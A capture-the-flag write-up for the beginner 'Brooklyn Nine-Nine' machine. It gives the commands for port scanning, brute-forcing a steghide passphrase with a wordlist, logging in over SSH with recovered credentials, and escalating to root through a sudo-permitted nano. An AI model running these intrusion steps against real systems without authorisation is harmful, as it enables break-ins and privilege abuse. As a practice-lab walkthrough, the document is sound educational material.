# Brooklyn Nine-Nine --- Writeup
<img width="1916" height="964" alt="Screenshot From 2026-03-06 19-39-09" src="https://github.com/user-attachments/assets/f0771e27-111e-4ea3-8abc-ca87eeceda34" />

## Overview

This writeup documents the compromise of the **Brooklyn Nine-Nine**
machine.\
The challenge is designed for beginners and focuses primarily on
**steganography**, **basic enumeration**, and **simple privilege
escalation** techniques.

Two intended paths exist to achieve root access. This writeup
demonstrates one of them.

Category: Web / Steganography
Difficulty: Easy
------------------------------------------------------------------------

# Enumeration

As usual, the first step is to perform a port scan to identify available
services.

``` bash
nmap -sC -sV <target-ip>
```

Example output:

``` bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

### Observations

Three services are exposed:

-   **FTP (21)** -- Anonymous login allowed
-   **SSH (22)** -- Remote login service
-   **HTTP (80)** -- Web server

Visiting the website reveals a simple page containing only a single
image.

Inspecting the **HTML source code** reveals the following hint:

``` html
<!-- Have you ever heard of steganography? -->
```

This strongly suggests that hidden data may exist within the image.

------------------------------------------------------------------------

# Steganography Analysis

Download the image from the website and begin examining it for hidden
content.

## Metadata Inspection

The first step is to inspect metadata using **exiftool**.

``` bash
exiftool brooklyn99.jpg
```

The metadata does not reveal anything suspicious, so the next step is to
attempt extraction using **steghide**.

``` bash
steghide extract -sf brooklyn99.jpg
```

However, extraction requires a **passphrase**.

------------------------------------------------------------------------

# Password Cracking

To brute-force the steghide passphrase, the tool **stegcracker** can be
used.

``` bash
stegcracker brooklyn99.jpg
```

Example output:
```bash
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2026 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: *****
Tried 20459 passwords
Your file has been written to: brooklyn99.jpg.out
```

Once the password is recovered, the hidden file can be extracted.

``` bash
steghide extract -sf brooklyn99.jpg
```

This reveals a file named:

    note.txt

Reading the file:

``` bash
cat note.txt
```

The file contains **SSH credentials**.

------------------------------------------------------------------------

# Initial Access

Using the discovered credentials, connect to the system via SSH.

``` bash
ssh holt@<target-ip>
```

After successful authentication, access to the machine is obtained and
the **user flag** can be retrieved.

<img width="1919" height="964" alt="2026-03-06_11-36" src="https://github.com/user-attachments/assets/cad08ed6-3359-4df0-a460-b085d57b9158" />

------------------------------------------------------------------------

# Privilege Escalation

Once logged in, the next step is to determine which commands can be
executed with elevated privileges.

``` bash
sudo -l
```

Output:

``` bash
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

The user is allowed to run **nano as root without a password**.

This can be abused using techniques documented in **GTFOBins**.

Reference: https://gtfobins.github.io/gtfobins/nano/

------------------------------------------------------------------------

# Root Access

Using nano with sudo, the root flag can be read directly.

``` bash
sudo nano /root/root.txt
```

This reveals the **root flag**, completing the machine.

<img width="1919" height="965" alt="2026-03-06_11-46" src="https://github.com/user-attachments/assets/7b8b1f6a-f2a8-4469-b720-8c99184b4aa2" />

------------------------------------------------------------------------

# Conclusion

This challenge demonstrates several common CTF concepts:

-   Basic service enumeration
-   Steganography analysis
-   Password cracking using wordlists
-   Credential reuse
-   Simple privilege escalation via misconfigured sudo permissions

Although an FTP service was available, it was not required in this
particular solution path. Alternative approaches may exist that leverage
it.

------------------------------------------------------------------------

# Tools Used

-   Nmap
-   ExifTool
-   Steghide
-   Stegcracker
-   SSH
-   GTFOBins

------------------------------------------------------------------------

# Author

Writeup prepared for educational purposes and CTF practice.
